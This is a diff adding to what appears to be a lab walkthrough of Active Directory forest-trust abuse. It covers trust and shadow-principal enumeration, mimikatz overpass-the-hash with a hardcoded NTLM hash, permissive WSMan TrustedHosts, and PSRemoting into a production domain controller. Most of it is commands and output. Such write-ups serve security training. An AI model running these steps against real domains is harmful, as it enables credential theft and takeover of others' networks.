@@ -368,3 +368,142 @@ bastion\administrator
 C:\Users\Administrator>
 
 ```
+
+In this process spawn a invishell:
+
+```
+Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
+
+
+Direction               : Outbound
+DisallowTransivity      : False
+DistinguishedName       : CN=bastion.local,CN=System,DC=production,DC=local
+ForestTransitive        : True
+IntraForest             : False
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : bastion.local
+ObjectClass             : trustedDomain
+ObjectGUID              : f6ebbca6-749d-4ee6-bb6d-d3bbb178fd02
+SelectiveAuthentication : False
+SIDFilteringForestAware : True
+SIDFilteringQuarantined : False
+Source                  : DC=production,DC=local
+Target                  : bastion.local
+TGTDelegation           : False
+TrustAttributes         : 1096
+TrustedPolicy           :
+TrustingPolicy          :
+TrustType               : Uplevel
+UplevelOnly             : False
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+
+```
+
+```
+
+PS C:\Users\Public> Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+
+
+Name                    : Shadow Principal Configuration
+member                  : {}
+msDS-ShadowPrincipalSid :
+
+Name                    : prodforest-ShadowEnterpriseAdmin
+member                  : {CN=Administrator,CN=Users,DC=bastion,DC=local}
+msDS-ShadowPrincipalSid : S-1-5-21-1765907967-2493560013-34545785-519
+
+```
+```
+
+PS C:\Users\Public> Get-DnsServerZone -ZoneName production.local |fl *
+Get-DnsServerZone -ZoneName production.local |fl *
+
+
+MasterServers          : 192.168.102.1
+DistinguishedName      : DC=production.local,cn=MicrosoftDNS,DC=ForestDnsZones,DC=bastion,DC=local
+IsAutoCreated          : False
+IsDsIntegrated         : True
+IsPaused               : False
+IsReadOnly             : False
+IsReverseLookupZone    : False
+IsShutdown             : False
+ZoneName               : production.local
+ZoneType               : Forwarder
+DirectoryPartitionName : ForestDnsZones.bastion.local
+ForwarderTimeout       : 3
+ReplicationScope       : Forest
+UseRecursion           : False
+PSComputerName         :
+CimClass               : root/Microsoft/Windows/DNS:DnsServerConditionalForwarderZone
+CimInstanceProperties  : {DistinguishedName, IsAutoCreated, IsDsIntegrated, IsPaused...}
+CimSystemProperties    : Microsoft.Management.Infrastructure.CimSystemProperties
+```
+
+On the attacker machine enable the WSMan connection to trusted hosts:
+```
+PS C:\Windows\system32> Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
+```
+
+```
+C:\Windows\system32>C:\AD\Tools\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::opassth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe
+user    : administrator
+domain  : bastion.local
+program : powershell.exe
+impers. : no
+NTLM    : f29207796c9e6829aa1882b7cccfa36d
+  |  PID  5084
+  |  TID  5148
+  |  LSA Process is now R/W
+  |  LUID 0 ; 202052638 (00000000:0c0b141e)
+  \_ msv1_0   - data copy @ 000002325C8D0060 : OK !
+  \_ kerberos - data copy @ 000002325D06D258
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000002325C6E32A8 (32) -> null
+
+```
+In teh new powershell:
+
+``` 
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> Enter-PSSession 192.168.102.1 -Authenticatio NegotiateWithImplicitCredential
+[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents> whoami
+bastion\administrator
+[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents> hostname
+Production-DC
+[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::ba49:45aa:56d9:4c97%4
+   IPv4 Address. . . . . . . . . . . : 192.168.102.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.102.254
+[192.168.102.1]: PS C:\Users\Administrator.BASTION\Documents>
+```
